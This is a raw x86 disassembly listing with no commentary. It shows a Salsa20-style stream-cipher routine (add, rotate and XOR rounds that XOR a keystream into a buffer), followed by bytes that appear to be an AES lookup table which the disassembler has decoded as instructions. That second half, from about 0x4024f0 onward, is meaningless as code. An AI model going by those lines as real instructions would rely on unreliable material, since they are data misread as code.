  40229b:	8d 04 3e             	lea    (%esi,%edi,1),%eax
  40229e:	8b 7c 24 38          	mov    0x38(%esp),%edi
  4022a2:	c1 c0 0d             	rol    $0xd,%eax
  4022a5:	31 44 24 10          	xor    %eax,0x10(%esp)
  4022a9:	8b 44 24 10          	mov    0x10(%esp),%eax
  4022ad:	89 44 24 5c          	mov    %eax,0x5c(%esp)
  4022b1:	03 c6                	add    %esi,%eax
  4022b3:	c1 c8 0e             	ror    $0xe,%eax
  4022b6:	8b 74 24 28          	mov    0x28(%esp),%esi
  4022ba:	33 f0                	xor    %eax,%esi
  4022bc:	8b 44 24 38          	mov    0x38(%esp),%eax
  4022c0:	03 44 24 2c          	add    0x2c(%esp),%eax
  4022c4:	c1 c0 07             	rol    $0x7,%eax
  4022c7:	31 44 24 14          	xor    %eax,0x14(%esp)
  4022cb:	8b 44 24 14          	mov    0x14(%esp),%eax
  4022cf:	89 44 24 68          	mov    %eax,0x68(%esp)
  4022d3:	03 44 24 2c          	add    0x2c(%esp),%eax
  4022d7:	c1 c0 09             	rol    $0x9,%eax
  4022da:	31 44 24 18          	xor    %eax,0x18(%esp)
  4022de:	8b 44 24 18          	mov    0x18(%esp),%eax
  4022e2:	89 44 24 6c          	mov    %eax,0x6c(%esp)
  4022e6:	03 44 24 14          	add    0x14(%esp),%eax
  4022ea:	c1 c0 0d             	rol    $0xd,%eax
  4022ed:	33 f8                	xor    %eax,%edi
  4022ef:	89 74 24 28          	mov    %esi,0x28(%esp)
  4022f3:	8b 44 24 18          	mov    0x18(%esp),%eax
  4022f7:	03 c7                	add    %edi,%eax
  4022f9:	89 7c 24 38          	mov    %edi,0x38(%esp)
  4022fd:	c1 c8 0e             	ror    $0xe,%eax
  402300:	89 7c 24 60          	mov    %edi,0x60(%esp)
  402304:	8b 7c 24 2c          	mov    0x2c(%esp),%edi
  402308:	33 f8                	xor    %eax,%edi
  40230a:	89 74 24 50          	mov    %esi,0x50(%esp)
  40230e:	8b 74 24 30          	mov    0x30(%esp),%esi
  402312:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402316:	03 c6                	add    %esi,%eax
  402318:	89 7c 24 2c          	mov    %edi,0x2c(%esp)
  40231c:	c1 c0 07             	rol    $0x7,%eax
  40231f:	33 d0                	xor    %eax,%edx
  402321:	89 7c 24 64          	mov    %edi,0x64(%esp)
  402325:	8b 7c 24 44          	mov    0x44(%esp),%edi
  402329:	8d 04 32             	lea    (%edx,%esi,1),%eax
  40232c:	c1 c0 09             	rol    $0x9,%eax
  40232f:	31 44 24 20          	xor    %eax,0x20(%esp)
  402333:	8b 44 24 20          	mov    0x20(%esp),%eax
  402337:	89 44 24 70          	mov    %eax,0x70(%esp)
  40233b:	03 c2                	add    %edx,%eax
  40233d:	c1 c0 0d             	rol    $0xd,%eax
  402340:	31 44 24 1c          	xor    %eax,0x1c(%esp)
  402344:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  402348:	89 44 24 74          	mov    %eax,0x74(%esp)
  40234c:	03 44 24 20          	add    0x20(%esp),%eax
  402350:	c1 c8 0e             	ror    $0xe,%eax
  402353:	33 f0                	xor    %eax,%esi
  402355:	8d 04 0b             	lea    (%ebx,%ecx,1),%eax
  402358:	c1 c0 07             	rol    $0x7,%eax
  40235b:	33 f8                	xor    %eax,%edi
  40235d:	89 74 24 30          	mov    %esi,0x30(%esp)
  402361:	89 74 24 78          	mov    %esi,0x78(%esp)
  402365:	89 bc 24 80 00 00 00 	mov    %edi,0x80(%esp)
  40236c:	8d 04 0f             	lea    (%edi,%ecx,1),%eax
  40236f:	c1 c0 09             	rol    $0x9,%eax
  402372:	33 e8                	xor    %eax,%ebp
  402374:	8d 04 2f             	lea    (%edi,%ebp,1),%eax
  402377:	c1 c0 0d             	rol    $0xd,%eax
  40237a:	33 d8                	xor    %eax,%ebx
  40237c:	8d 04 2b             	lea    (%ebx,%ebp,1),%eax
  40237f:	c1 c8 0e             	ror    $0xe,%eax
  402382:	33 c8                	xor    %eax,%ecx
  402384:	83 6c 24 40 01       	subl   $0x1,0x40(%esp)
  402389:	8b 44 24 28          	mov    0x28(%esp),%eax
  40238d:	0f 85 03 fe ff ff    	jne    0x402196
  402393:	8b 74 24 48          	mov    0x48(%esp),%esi
  402397:	33 c0                	xor    %eax,%eax
  402399:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  40239d:	89 8c 24 8c 00 00 00 	mov    %ecx,0x8c(%esp)
  4023a4:	8d 4c 24 50          	lea    0x50(%esp),%ecx
  4023a8:	89 54 24 7c          	mov    %edx,0x7c(%esp)
  4023ac:	8b 94 24 98 00 00 00 	mov    0x98(%esp),%edx
  4023b3:	89 9c 24 88 00 00 00 	mov    %ebx,0x88(%esp)
  4023ba:	89 ac 24 84 00 00 00 	mov    %ebp,0x84(%esp)
  4023c1:	3b 4c 24 4c          	cmp    0x4c(%esp),%ecx
  4023c5:	77 1a                	ja     0x4023e1
  4023c7:	8d 8c 24 8c 00 00 00 	lea    0x8c(%esp),%ecx
  4023ce:	3b ce                	cmp    %esi,%ecx
  4023d0:	72 0f                	jb     0x4023e1
  4023d2:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  4023d5:	01 4c 84 50          	add    %ecx,0x50(%esp,%eax,4)
  4023d9:	40                   	inc    %eax
  4023da:	83 f8 10             	cmp    $0x10,%eax
  4023dd:	7c f3                	jl     0x4023d2
  4023df:	eb 2d                	jmp    0x40240e
  4023e1:	0f 10 4c 84 50       	movups 0x50(%esp,%eax,4),%xmm1
  4023e6:	0f 10 04 86          	movups (%esi,%eax,4),%xmm0
  4023ea:	66 0f fe c8          	paddd  %xmm0,%xmm1
  4023ee:	0f 11 4c 84 50       	movups %xmm1,0x50(%esp,%eax,4)
  4023f3:	0f 10 44 84 60       	movups 0x60(%esp,%eax,4),%xmm0
  4023f8:	0f 10 4c 86 10       	movups 0x10(%esi,%eax,4),%xmm1
  4023fd:	66 0f fe c8          	paddd  %xmm0,%xmm1
  402401:	0f 11 4c 84 60       	movups %xmm1,0x60(%esp,%eax,4)
  402406:	83 c0 08             	add    $0x8,%eax
  402409:	83 f8 10             	cmp    $0x10,%eax
  40240c:	7c d3                	jl     0x4023e1
  40240e:	83 46 20 01          	addl   $0x1,0x20(%esi)
  402412:	8b da                	mov    %edx,%ebx
  402414:	b8 40 00 00 00       	mov    $0x40,%eax
  402419:	83 56 24 00          	adcl   $0x0,0x24(%esi)
  40241d:	83 fa 40             	cmp    $0x40,%edx
  402420:	0f 47 d8             	cmova  %eax,%ebx
  402423:	33 d2                	xor    %edx,%edx
  402425:	85 db                	test   %ebx,%ebx
  402427:	0f 84 97 00 00 00    	je     0x4024c4
  40242d:	83 fb 20             	cmp    $0x20,%ebx
  402430:	72 6f                	jb     0x4024a1
  402432:	8d 4f ff             	lea    -0x1(%edi),%ecx
  402435:	8d 44 1c 4f          	lea    0x4f(%esp,%ebx,1),%eax
  402439:	03 cb                	add    %ebx,%ecx
  40243b:	3b f8                	cmp    %eax,%edi
  40243d:	77 08                	ja     0x402447
  40243f:	8d 44 24 50          	lea    0x50(%esp),%eax
  402443:	3b c8                	cmp    %eax,%ecx
  402445:	73 5a                	jae    0x4024a1
  402447:	8b c7                	mov    %edi,%eax
  402449:	8d 74 24 60          	lea    0x60(%esp),%esi
  40244d:	8b cf                	mov    %edi,%ecx
  40244f:	f7 d8                	neg    %eax
  402451:	8b eb                	mov    %ebx,%ebp
  402453:	8d 7c 24 50          	lea    0x50(%esp),%edi
  402457:	03 f8                	add    %eax,%edi
  402459:	83 e5 e0             	and    $0xffffffe0,%ebp
  40245c:	03 c6                	add    %esi,%eax
  40245e:	89 7c 24 44          	mov    %edi,0x44(%esp)
  402462:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  402466:	89 44 24 40          	mov    %eax,0x40(%esp)
  40246a:	8b 44 24 44          	mov    0x44(%esp),%eax
  40246e:	8b 74 24 40          	mov    0x40(%esp),%esi
  402472:	0f 10 01             	movups (%ecx),%xmm0
  402475:	83 c2 20             	add    $0x20,%edx
  402478:	8d 49 20             	lea    0x20(%ecx),%ecx
  40247b:	0f 10 4c 08 e0       	movups -0x20(%eax,%ecx,1),%xmm1
  402480:	66 0f ef c8          	pxor   %xmm0,%xmm1
  402484:	0f 11 49 e0          	movups %xmm1,-0x20(%ecx)
  402488:	0f 10 41 f0          	movups -0x10(%ecx),%xmm0
  40248c:	0f 10 4c 0e e0       	movups -0x20(%esi,%ecx,1),%xmm1
  402491:	66 0f ef c8          	pxor   %xmm0,%xmm1
  402495:	0f 11 49 f0          	movups %xmm1,-0x10(%ecx)
  402499:	3b d5                	cmp    %ebp,%edx
  40249b:	72 d5                	jb     0x402472
  40249d:	8b 74 24 48          	mov    0x48(%esp),%esi
  4024a1:	3b d3                	cmp    %ebx,%edx
  4024a3:	73 1f                	jae    0x4024c4
  4024a5:	8d 6c 24 50          	lea    0x50(%esp),%ebp
  4024a9:	8d 0c 3a             	lea    (%edx,%edi,1),%ecx
  4024ac:	2b ef                	sub    %edi,%ebp
  4024ae:	8b fb                	mov    %ebx,%edi
  4024b0:	2b fa                	sub    %edx,%edi
  4024b2:	8a 04 29             	mov    (%ecx,%ebp,1),%al
  4024b5:	8d 49 01             	lea    0x1(%ecx),%ecx
  4024b8:	30 41 ff             	xor    %al,-0x1(%ecx)
  4024bb:	83 ef 01             	sub    $0x1,%edi
  4024be:	75 f2                	jne    0x4024b2
  4024c0:	8b 7c 24 3c          	mov    0x3c(%esp),%edi
  4024c4:	8b 94 24 98 00 00 00 	mov    0x98(%esp),%edx
  4024cb:	03 fb                	add    %ebx,%edi
  4024cd:	2b d3                	sub    %ebx,%edx
  4024cf:	89 7c 24 3c          	mov    %edi,0x3c(%esp)
  4024d3:	89 94 24 98 00 00 00 	mov    %edx,0x98(%esp)
  4024da:	85 d2                	test   %edx,%edx
  4024dc:	0f 85 10 fc ff ff    	jne    0x4020f2
  4024e2:	5d                   	pop    %ebp
  4024e3:	5b                   	pop    %ebx
  4024e4:	5f                   	pop    %edi
  4024e5:	5e                   	pop    %esi
  4024e6:	81 c4 84 00 00 00    	add    $0x84,%esp
  4024ec:	c3                   	ret
  4024ed:	8d 40 00             	lea    0x0(%eax),%eax
  4024f0:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4024f1:	63 63 c6             	arpl   %esp,-0x3a(%ebx)
  4024f4:	84 7c 7c f8          	test   %bh,-0x8(%esp,%edi,2)
  4024f8:	99                   	cltd
  4024f9:	77 77                	ja     0x402572
  4024fb:	ee                   	out    %al,(%dx)
  4024fc:	8d 7b 7b             	lea    0x7b(%ebx),%edi
  4024ff:	f6 0d f2 f2 ff bd 6b 	testb  $0x6b,0xbdfff2f2
  402506:	6b d6 b1             	imul   $0xffffffb1,%esi,%edx
  402509:	6f                   	outsl  %ds:(%esi),(%dx)
  40250a:	6f                   	outsl  %ds:(%esi),(%dx)
  40250b:	de 54 c5 c5          	ficoms -0x3b(%ebp,%eax,8)
  40250f:	91                   	xchg   %eax,%ecx
  402510:	50                   	push   %eax
  402511:	30 30                	xor    %dh,(%eax)
  402513:	60                   	pusha
  402514:	03 01                	add    (%ecx),%eax
  402516:	01 02                	add    %eax,(%edx)
  402518:	a9 67 67 ce 7d       	test   $0x7dce6767,%eax
  40251d:	2b 2b                	sub    (%ebx),%ebp
  40251f:	56                   	push   %esi
  402520:	19 fe                	sbb    %edi,%esi
  402522:	fe                   	(bad)
  402523:	e7 62                	out    %eax,$0x62
  402525:	d7                   	xlat   %ds:(%ebx)
  402526:	d7                   	xlat   %ds:(%ebx)
  402527:	b5 e6                	mov    $0xe6,%ch
  402529:	ab                   	stos   %eax,%es:(%edi)
  40252a:	ab                   	stos   %eax,%es:(%edi)
  40252b:	4d                   	dec    %ebp
  40252c:	9a 76 76 ec 45 ca ca 	lcall  $0xcaca,$0x45ec7676
  402533:	8f                   	(bad)
  402534:	9d                   	popf
  402535:	82 82 1f 40 c9 c9 89 	addb   $0x89,-0x3636bfe1(%edx)
  40253c:	87 7d 7d             	xchg   %edi,0x7d(%ebp)
  40253f:	fa                   	cli
  402540:	15 fa fa ef eb       	adc    $0xebeffafa,%eax
  402545:	59                   	pop    %ecx
  402546:	59                   	pop    %ecx
  402547:	b2 c9                	mov    $0xc9,%dl
  402549:	47                   	inc    %edi
  40254a:	47                   	inc    %edi
  40254b:	8e 0b                	mov    (%ebx),%cs
  40254d:	f0 f0 fb             	lock lock sti
  402550:	ec                   	in     (%dx),%al
  402551:	ad                   	lods   %ds:(%esi),%eax
  402552:	ad                   	lods   %ds:(%esi),%eax
  402553:	41                   	inc    %ecx
  402554:	67 d4 d4             	addr16 aam $0xd4
  402557:	b3 fd                	mov    $0xfd,%bl
  402559:	a2 a2 5f ea af       	mov    %al,0xafea5fa2
  40255e:	af                   	scas   %es:(%edi),%eax
  40255f:	45                   	inc    %ebp
  402560:	bf 9c 9c 23 f7       	mov    $0xf7239c9c,%edi
  402565:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402566:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402567:	53                   	push   %ebx
  402568:	96                   	xchg   %eax,%esi
  402569:	72 72                	jb     0x4025dd
  40256b:	e4 5b                	in     $0x5b,%al
  40256d:	c0 c0 9b             	rol    $0x9b,%al
  402570:	c2 b7 b7             	ret    $0xb7b7
  402573:	75 1c                	jne    0x402591
  402575:	fd                   	std
  402576:	fd                   	std
  402577:	e1 ae                	loope  0x402527
  402579:	93                   	xchg   %eax,%ebx
  40257a:	93                   	xchg   %eax,%ebx
  40257b:	3d 6a 26 26 4c       	cmp    $0x4c26266a,%eax
  402580:	5a                   	pop    %edx
  402581:	36 36 6c             	ss ss insb (%dx),%es:(%edi)
  402584:	41                   	inc    %ecx
  402585:	3f                   	aas
  402586:	3f                   	aas
  402587:	7e 02                	jle    0x40258b
  402589:	f7 f7                	div    %edi
  40258b:	f5                   	cmc
  40258c:	4f                   	dec    %edi
  40258d:	cc                   	int3
  40258e:	cc                   	int3
  40258f:	83 5c 34 34 68       	sbbl   $0x68,0x34(%esp,%esi,1)
  402594:	f4                   	hlt
  402595:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402596:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402597:	51                   	push   %ecx
  402598:	34 e5                	xor    $0xe5,%al
  40259a:	e5 d1                	in     $0xd1,%eax
  40259c:	08 f1                	or     %dh,%cl
  40259e:	f1                   	int1
  40259f:	f9                   	stc
  4025a0:	93                   	xchg   %eax,%ebx
  4025a1:	71 71                	jno    0x402614
  4025a3:	e2 73                	loop   0x402618
  4025a5:	d8 d8                	fcomp  %st(0)
  4025a7:	ab                   	stos   %eax,%es:(%edi)
  4025a8:	53                   	push   %ebx
  4025a9:	31 31                	xor    %esi,(%ecx)
  4025ab:	62 3f                	bound  %edi,(%edi)
  4025ad:	15 15 2a 0c 04       	adc    $0x40c2a15,%eax
  4025b2:	04 08                	add    $0x8,%al
  4025b4:	52                   	push   %edx
  4025b5:	c7 c7 95 65 23 23    	mov    $0x23236595,%edi
  4025bb:	46                   	inc    %esi
  4025bc:	5e                   	pop    %esi
  4025bd:	c3                   	ret
  4025be:	c3                   	ret
  4025bf:	9d                   	popf
  4025c0:	28 18                	sub    %bl,(%eax)
  4025c2:	18 30                	sbb    %dh,(%eax)
  4025c4:	a1 96 96 37 0f       	mov    0xf379696,%eax
  4025c9:	05 05 0a b5 9a       	add    $0x9ab50a05,%eax
  4025ce:	9a 2f 09 07 07 0e 36 	lcall  $0x360e,$0x707092f
  4025d5:	12 12                	adc    (%edx),%dl
  4025d7:	24 9b                	and    $0x9b,%al
  4025d9:	80 80 1b 3d e2 e2 df 	addb   $0xdf,-0x1d1dc2e5(%eax)
  4025e0:	26 eb eb             	es jmp 0x4025ce
  4025e3:	cd 69                	int    $0x69
  4025e5:	27                   	daa
  4025e6:	27                   	daa
  4025e7:	4e                   	dec    %esi
  4025e8:	cd b2                	int    $0xb2
  4025ea:	b2 7f                	mov    $0x7f,%dl
  4025ec:	9f                   	lahf
  4025ed:	75 75                	jne    0x402664
  4025ef:	ea 1b 09 09 12 9e 83 	ljmp   $0x839e,$0x1209091b
  4025f6:	83 1d 74 2c 2c 58 2e 	sbbl   $0x2e,0x582c2c74
  4025fd:	1a 1a                	sbb    (%edx),%bl
  4025ff:	34 2d                	xor    $0x2d,%al
  402601:	1b 1b                	sbb    (%ebx),%ebx
  402603:	36 b2 6e             	ss mov $0x6e,%dl
  402606:	6e                   	outsb  %ds:(%esi),(%dx)
  402607:	dc ee                	fsubr  %st,%st(6)
  402609:	5a                   	pop    %edx
  40260a:	5a                   	pop    %edx
  40260b:	b4 fb                	mov    $0xfb,%ah
  40260d:	a0 a0 5b f6 52       	mov    0x52f65ba0,%al
  402612:	52                   	push   %edx
  402613:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402614:	4d                   	dec    %ebp
  402615:	3b 3b                	cmp    (%ebx),%edi
  402617:	76 61                	jbe    0x40267a
  402619:	d6                   	salc
  40261a:	d6                   	salc
  40261b:	b7 ce                	mov    $0xce,%bh
  40261d:	b3 b3                	mov    $0xb3,%bl
  40261f:	7d 7b                	jge    0x40269c
  402621:	29 29                	sub    %ebp,(%ecx)
  402623:	52                   	push   %edx
  402624:	3e e3 e3             	jecxz,pt 0x40260a
  402627:	dd 71 2f             	fnsave 0x2f(%ecx)
  40262a:	2f                   	das
  40262b:	5e                   	pop    %esi
  40262c:	97                   	xchg   %eax,%edi
  40262d:	84 84 13 f5 53 53 a6 	test   %al,-0x59acac0b(%ebx,%edx,1)
  402634:	68 d1 d1 b9 00       	push   $0xb9d1d1
  402639:	00 00                	add    %al,(%eax)
  40263b:	00 2c ed ed c1 60 20 	add    %ch,0x2060c1ed(,%ebp,8)
  402642:	20 40 1f             	and    %al,0x1f(%eax)
  402645:	fc                   	cld
  402646:	fc                   	cld
  402647:	e3 c8                	jecxz  0x402611
  402649:	b1 b1                	mov    $0xb1,%cl
  40264b:	79 ed                	jns    0x40263a
  40264d:	5b                   	pop    %ebx
  40264e:	5b                   	pop    %ebx
  40264f:	b6 be                	mov    $0xbe,%dh
  402651:	6a 6a                	push   $0x6a
  402653:	d4 46                	aam    $0x46
  402655:	cb                   	lret
  402656:	cb                   	lret
  402657:	8d                   	lea    (bad),%ebx
  402658:	d9 be be 67 4b 39    	fnstcw 0x394b67be(%esi)
  40265e:	39 72 de             	cmp    %esi,-0x22(%edx)
  402661:	4a                   	dec    %edx
  402662:	4a                   	dec    %edx
  402663:	94                   	xchg   %eax,%esp
  402664:	d4 4c                	aam    $0x4c
  402666:	4c                   	dec    %esp
  402667:	98                   	cwtl
  402668:	e8 58 58 b0 4a       	call   0x4af07ec5
  40266d:	cf                   	iret
  40266e:	cf                   	iret
  40266f:	85 6b d0             	test   %ebp,-0x30(%ebx)
  402672:	d0 bb 2a ef ef c5    	sarb   $1,-0x3a1010d6(%ebx)
  402678:	e5 aa                	in     $0xaa,%eax
  40267a:	aa                   	stos   %al,%es:(%edi)
  40267b:	4f                   	dec    %edi
  40267c:	16                   	push   %ss
  40267d:	fb                   	sti
  40267e:	fb                   	sti
  40267f:	ed                   	in     (%dx),%eax
  402680:	c5 43 43             	lds    0x43(%ebx),%eax
  402683:	86 d7                	xchg   %dl,%bh
  402685:	4d                   	dec    %ebp
  402686:	4d                   	dec    %ebp
  402687:	9a 55 33 33 66 94 85 	lcall  $0x8594,$0x66333355
  40268e:	85 11                	test   %edx,(%ecx)
  402690:	cf                   	iret
  402691:	45                   	inc    %ebp
  402692:	45                   	inc    %ebp
  402693:	8a 10                	mov    (%eax),%dl
  402695:	f9                   	stc
  402696:	f9                   	stc
  402697:	e9 06 02 02 04       	jmp    0x44228a2
  40269c:	81 7f 7f fe f0 50 50 	cmpl   $0x5050f0fe,0x7f(%edi)
  4026a3:	a0 44 3c 3c 78       	mov    0x783c3c44,%al
  4026a8:	ba 9f 9f 25 e3       	mov    $0xe3259f9f,%edx
  4026ad:	a8 a8                	test   $0xa8,%al
  4026af:	4b                   	dec    %ebx
  4026b0:	f3 51                	repz push %ecx
  4026b2:	51                   	push   %ecx
  4026b3:	a2 fe a3 a3 5d       	mov    %al,0x5da3a3fe
  4026b8:	c0 40 40 80          	rolb   $0x80,0x40(%eax)
  4026bc:	8a 8f 8f 05 ad 92    	mov    -0x6d52fa71(%edi),%cl
  4026c2:	92                   	xchg   %eax,%edx
  4026c3:	3f                   	aas
  4026c4:	bc 9d 9d 21 48       	mov    $0x48219d9d,%esp
  4026c9:	38 38                	cmp    %bh,(%eax)
  4026cb:	70 04                	jo     0x4026d1
  4026cd:	f5                   	cmc
  4026ce:	f5                   	cmc
  4026cf:	f1                   	int1
  4026d0:	df bc bc 63 c1 b6 b6 	fistpll -0x49493e9d(%esp,%edi,4)
  4026d7:	77 75                	ja     0x40274e
  4026d9:	da da                	fcmovu %st(2),%st
  4026db:	af                   	scas   %es:(%edi),%eax
  4026dc:	63 21                	arpl   %esp,(%ecx)
  4026de:	21 42 30             	and    %eax,0x30(%edx)
  4026e1:	10 10                	adc    %dl,(%eax)
  4026e3:	20 1a                	and    %bl,(%edx)
  4026e5:	ff                   	(bad)
  4026e6:	ff e5                	jmp    *%ebp
  4026e8:	0e                   	push   %cs
  4026e9:	f3 f3 fd             	repz repz std
  4026ec:	6d                   	insl   (%dx),%es:(%edi)
  4026ed:	d2 d2                	rcl    %cl,%dl
  4026ef:	bf 4c cd cd 81       	mov    $0x81cdcd4c,%edi
  4026f4:	14 0c                	adc    $0xc,%al
  4026f6:	0c 18                	or     $0x18,%al
  4026f8:	35 13 13 26 2f       	xor    $0x2f261313,%eax
  4026fd:	ec                   	in     (%dx),%al
  4026fe:	ec                   	in     (%dx),%al
  4026ff:	c3                   	ret
  402700:	e1 5f                	loope  0x402761
  402702:	5f                   	pop    %edi
  402703:	be a2 97 97 35       	mov    $0x359797a2,%esi
  402708:	cc                   	int3
  402709:	44                   	inc    %esp
  40270a:	44                   	inc    %esp
  40270b:	88 39                	mov    %bh,(%ecx)
  40270d:	17                   	pop    %ss
  40270e:	17                   	pop    %ss
  40270f:	2e 57                	cs push %edi
  402711:	c4                   	(bad)
  402712:	c4 93 f2 a7 a7 55    	les    0x55a7a7f2(%ebx),%edx
  402718:	82 7e 7e fc          	cmpb   $0xfc,0x7e(%esi)
  40271c:	47                   	inc    %edi
  40271d:	3d 3d 7a ac 64       	cmp    $0x64ac7a3d,%eax
  402722:	64 c8 e7 5d 5d       	fs enter $0x5de7,$0x5d
  402727:	ba 2b 19 19 32       	mov    $0x3219192b,%edx
  40272c:	95                   	xchg   %eax,%ebp
  40272d:	73 73                	jae    0x4027a2
  40272f:	e6 a0                	out    %al,$0xa0
  402731:	60                   	pusha
  402732:	60                   	pusha
  402733:	c0 98 81 81 19 d1 4f 	rcrb   $0x4f,-0x2ee67e7f(%eax)
  40273a:	4f                   	dec    %edi
  40273b:	9e                   	sahf
  40273c:	7f dc                	jg     0x40271a
  40273e:	dc a3 66 22 22 44    	fsubl  0x44222266(%ebx)
  402744:	7e 2a                	jle    0x402770
  402746:	2a 54 ab 90          	sub    -0x70(%ebx,%ebp,4),%dl
  40274a:	90                   	nop
  40274b:	3b 83 88 88 0b ca    	cmp    -0x35f47778(%ebx),%eax
  402751:	46                   	inc    %esi
  402752:	46                   	inc    %esi
  402753:	8c 29                	mov    %gs,(%ecx)
  402755:	ee                   	out    %al,(%dx)
  402756:	ee                   	out    %al,(%dx)
  402757:	c7                   	(bad)
  402758:	d3 b8 b8 6b 3c 14    	sarl   %cl,0x143c6bb8(%eax)
  40275e:	14 28                	adc    $0x28,%al
  402760:	79 de                	jns    0x402740
  402762:	de a7 e2 5e 5e bc    	fisubs -0x43a1a11e(%edi)
  402768:	1d 0b 0b 16 76       	sbb    $0x76160b0b,%eax
  40276d:	db db                	fcmovnu %st(3),%st
  40276f:	ad                   	lods   %ds:(%esi),%eax
  402770:	3b e0                	cmp    %eax,%esp
  402772:	e0 db                	loopne 0x40274f
  402774:	56                   	push   %esi
  402775:	32 32                	xor    (%edx),%dh
  402777:	64 4e                	fs dec %esi
  402779:	3a 3a                	cmp    (%edx),%bh
  40277b:	74 1e                	je     0x40279b
  40277d:	0a 0a                	or     (%edx),%cl
  40277f:	14 db                	adc    $0xdb,%al
  402781:	49                   	dec    %ecx
  402782:	49                   	dec    %ecx
  402783:	92                   	xchg   %eax,%edx
  402784:	0a 06                	or     (%esi),%al
  402786:	06                   	push   %es
  402787:	0c 6c                	or     $0x6c,%al
  402789:	24 24                	and    $0x24,%al
  40278b:	48                   	dec    %eax
  40278c:	e4 5c                	in     $0x5c,%al
  40278e:	5c                   	pop    %esp
  40278f:	b8 5d c2 c2 9f       	mov    $0x9fc2c25d,%eax
  402794:	6e                   	outsb  %ds:(%esi),(%dx)
  402795:	d3 d3                	rcl    %cl,%ebx
  402797:	bd ef ac ac 43       	mov    $0x43acacef,%ebp
  40279c:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40279d:	62 62 c4             	bound  %esp,-0x3c(%edx)
  4027a0:	a8 91                	test   $0x91,%al
  4027a2:	91                   	xchg   %eax,%ecx
  4027a3:	39 a4 95 95 31 37 e4 	cmp    %esp,-0x1bc8ce6b(%ebp,%edx,4)
  4027aa:	e4 d3                	in     $0xd3,%al
  4027ac:	8b 79 79             	mov    0x79(%ecx),%edi
  4027af:	f2 32 e7             	repnz xor %bh,%ah
  4027b2:	e7 d5                	out    %eax,$0xd5
  4027b4:	43                   	inc    %ebx
  4027b5:	c8 c8 8b 59          	enter  $0x8bc8,$0x59
  4027b9:	37                   	aaa
  4027ba:	37                   	aaa
  4027bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4027bc:	b7 6d                	mov    $0x6d,%bh
  4027be:	6d                   	insl   (%dx),%es:(%edi)
  4027bf:	da 8c 8d 8d 01 64 d5 	fimull -0x2a9bfe73(%ebp,%ecx,4)
  4027c6:	d5 b1                	aad    $0xb1
  4027c8:	d2 4e 4e             	rorb   %cl,0x4e(%esi)
  4027cb:	9c                   	pushf
  4027cc:	e0 a9                	loopne 0x402777
  4027ce:	a9 49 b4 6c 6c       	test   $0x6c6cb449,%eax
  4027d3:	d8 fa                	fdivr  %st(2),%st
  4027d5:	56                   	push   %esi
  4027d6:	56                   	push   %esi
  4027d7:	ac                   	lods   %ds:(%esi),%al
  4027d8:	07                   	pop    %es
  4027d9:	f4                   	hlt
  4027da:	f4                   	hlt
  4027db:	f3 25 ea ea cf af    	repz and $0xafcfeaea,%eax
  4027e1:	65 65 ca 8e 7a       	gs gs lret $0x7a8e
  4027e6:	7a f4                	jp     0x4027dc
  4027e8:	e9 ae ae 47 18       	jmp    0x1887d69b
  4027ed:	08 08                	or     %cl,(%eax)
  4027ef:	10 d5                	adc    %dl,%ch
  4027f1:	ba ba 6f 88 78       	mov    $0x78886fba,%edx
  4027f6:	78 f0                	js     0x4027e8
  4027f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4027f9:	25 25 4a 72 2e       	and    $0x2e724a25,%eax
  4027fe:	2e 5c                	cs pop %esp
  402800:	24 1c                	and    $0x1c,%al
  402802:	1c 38                	sbb    $0x38,%al
  402804:	f1                   	int1
  402805:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402806:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402807:	57                   	push   %edi
  402808:	c7                   	(bad)
  402809:	b4 b4                	mov    $0xb4,%ah
  40280b:	73 51                	jae    0x40285e
  40280d:	c6 c6 97             	mov    $0x97,%dh
  402810:	23 e8                	and    %eax,%ebp
  402812:	e8 cb 7c dd dd       	call   0xde1da4e2
  402817:	a1 9c 74 74 e8       	mov    0xe874749c,%eax
  40281c:	21 1f                	and    %ebx,(%edi)
  40281e:	1f                   	pop    %ds
  40281f:	3e dd 4b 4b          	fisttpll %ds:0x4b(%ebx)
  402823:	96                   	xchg   %eax,%esi
  402824:	dc bd bd 61 86 8b    	fdivrl -0x74799e43(%ebp)
  40282a:	8b 0d 85 8a 8a 0f    	mov    0xf8a8a85,%ecx
  402830:	90                   	nop
  402831:	70 70                	jo     0x4028a3
  402833:	e0 42                	loopne 0x402877
  402835:	3e 3e 7c c4          	ds jl,pt 0x4027fd
  402839:	b5 b5                	mov    $0xb5,%ch
  40283b:	71 aa                	jno    0x4027e7
  40283d:	66 66 cc             	data16 data16 int3
  402840:	d8 48 48             	fmuls  0x48(%eax)
  402843:	90                   	nop
  402844:	05 03 03 06 01       	add    $0x1060303,%eax
  402849:	f6 f6                	div    %dh
  40284b:	f7 12                	notl   (%edx)
  40284d:	0e                   	push   %cs
  40284e:	0e                   	push   %cs
  40284f:	1c a3                	sbb    $0xa3,%al
  402851:	61                   	popa
  402852:	61                   	popa
  402853:	c2 5f 35             	ret    $0x355f
  402856:	35 6a f9 57 57       	xor    $0x5757f96a,%eax
  40285b:	ae                   	scas   %es:(%edi),%al
  40285c:	d0 b9 b9 69 91 86    	sarb   $1,-0x796e9647(%ecx)
  402862:	86 17                	xchg   %dl,(%edi)
  402864:	58                   	pop    %eax
  402865:	c1 c1 99             	rol    $0x99,%ecx
  402868:	27                   	daa
  402869:	1d 1d 3a b9 9e       	sbb    $0x9eb93a1d,%eax
  40286e:	9e                   	sahf
  40286f:	27                   	daa
  402870:	38 e1                	cmp    %ah,%cl
  402872:	e1 d9                	loope  0x40284d
  402874:	13 f8                	adc    %eax,%edi
  402876:	f8                   	clc
  402877:	eb b3                	jmp    0x40282c
  402879:	98                   	cwtl
  40287a:	98                   	cwtl
  40287b:	2b 33                	sub    (%ebx),%esi
  40287d:	11 11                	adc    %edx,(%ecx)
